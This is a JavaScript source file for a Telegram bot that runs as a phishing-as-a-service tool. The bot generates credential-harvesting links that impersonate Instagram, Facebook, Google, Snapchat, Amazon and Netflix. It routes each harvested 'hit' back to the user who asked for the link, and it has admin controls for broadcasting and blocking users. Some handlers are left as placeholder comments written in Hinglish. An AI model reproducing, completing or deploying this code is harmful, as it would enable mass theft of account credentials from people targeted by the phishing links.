const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// --- ⚙️ CONFIGURATION ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const HARVESTER_URL = process.env.HARVESTER_URL;
const OWNER_ID = process.env.OWNER_ID; 
const CHANNEL_ID = process.env.CHANNEL_ID;
const CHANNEL_LINK = process.env.CHANNEL_LINK;

if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
    console.error("FATAL ERROR: One or more environment variables are missing.");
    process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, { polling: { interval: 300, autoStart: true, params: { timeout: 10 } } });
const DB_PATH = './db.json';
let adminState = {};

// --- DB Functions ---
const readDb = () => {
    if (!fs.existsSync(DB_PATH)) {
        fs.writeFileSync(DB_PATH, JSON.stringify({ users: [], admins: [parseInt(OWNER_ID)], blocked_users: [] }, null, 2));
    }
    return JSON.parse(fs.readFileSync(DB_PATH));
};
const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
const isAdmin = (userId) => {
    const db = readDb();
    return db.admins.includes(parseInt(userId));
};

// --- KEYBOARDS ---
const adminKeyboard = [
    [{ text: "📊 User Status", callback_data: "admin_status" }, { text: "📢 Broadcast", callback_data: "admin_broadcast" }],
    [{ text: "🔗 Generate Link", callback_data: "admin_generate_link" }],
    [{ text: "➕ Add Admin", callback_data: "admin_add" }, { text: "➖ Remove Admin", callback_data: "admin_remove" }],
    [{ text: "🚫 Block User", callback_data: "admin_block" }, { text: "✅ Unblock User", callback_data: "admin_unblock" }]
];
const linkGenerationKeyboard = [
    [{ text: '📸 Instagram', callback_data: 'gen_link_Instagram' }, { text: '📘 Facebook', callback_data: 'gen_link_Facebook' }],
    [{ text: '🇬 Google', callback_data: 'gen_link_Google' }, { text: '👻 Snapchat', callback_data: 'gen_link_Snapchat' }],
    [{ text: '📦 Amazon', callback_data: 'gen_link_Amazon' }, { text: '🎬 Netflix', callback_data: 'gen_link_Netflix' }],
    [{ text: '⬅️ Back to Admin Panel', callback_data: 'admin_panel_back' }] // This button is ONLY for admins
];

// --- /start COMMAND ---
bot.onText(/\/start/, async (msg) => {
    // ... (/start ka code waisa hi rahega jaisa pichle jawaab mein tha) ...
});

// --- CALLBACK QUERY HANDLER (THE FINAL FIX) ---
bot.on('callback_query', (query) => {
    const userId = query.from.id;
    const data = query.data;
    const messageId = query.message.message_id;

    if (data === 'check_join') {
        bot.answerCallbackQuery(query.id);
        bot.sendMessage(userId, "Now type /start again to verify.");
        return;
    }

    const [type, command, service] = data.split('_');

    // --- Link Generation (Works for EVERYONE) ---
    if (type === 'gen' && command === 'link') {
        const genService = service;
        const attackLink = `${HARVESTER_URL}/?service=${genService}&uid=${userId}`;
        bot.sendMessage(userId, `✅ **Link for [${genService}]**:\n\`${attackLink}\``, { parse_mode: 'Markdown' });
        bot.answerCallbackQuery(query.id);
        return;
    }
    
    // --- Admin Commands (ONLY for Admins) ---
    if (isAdmin(userId)) {
        if (type === 'admin') {
            switch (command) {
                case 'status':
                    const db = readDb();
                    const statusText = `📊 **Bot Status**\n\n👥 Users: ${db.users.length}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`;
                    bot.editMessageText(statusText, { chat_id: userId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
                    break;
                case 'generate':
                    bot.editMessageText("🔗 **Admin Link Generator**\nSelect a service. Hits will be sent to YOU.", { chat_id: userId, message_id: messageId, reply_markup: { inline_keyboard: linkGenerationKeyboard } });
                    break;
                case 'panel': // Back button logic
                    bot.editMessageText("👑 **Admin Panel** 👑", { chat_id: userId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
                    break;
                default:
                    const prompts = { 'broadcast': '...', 'add': '...', 'remove': '...', 'block': '...', 'unblock': '...' };
                    if (prompts[command]) {
                        adminState[userId] = command;
                        bot.sendMessage(userId, prompts[command].replace('...', '')); // Simplified
                    }
                    break;
            }
        }
    } else {
        bot.answerCallbackQuery(query.id, { text: "❌ Command not available for users.", show_alert: true });
    }
    
    bot.answerCallbackQuery(query.id);
});

// ... (Message handler code waisa hi rahega) ...

console.log('🔥 PhaaS Engine (Final Lockdown) is online.');
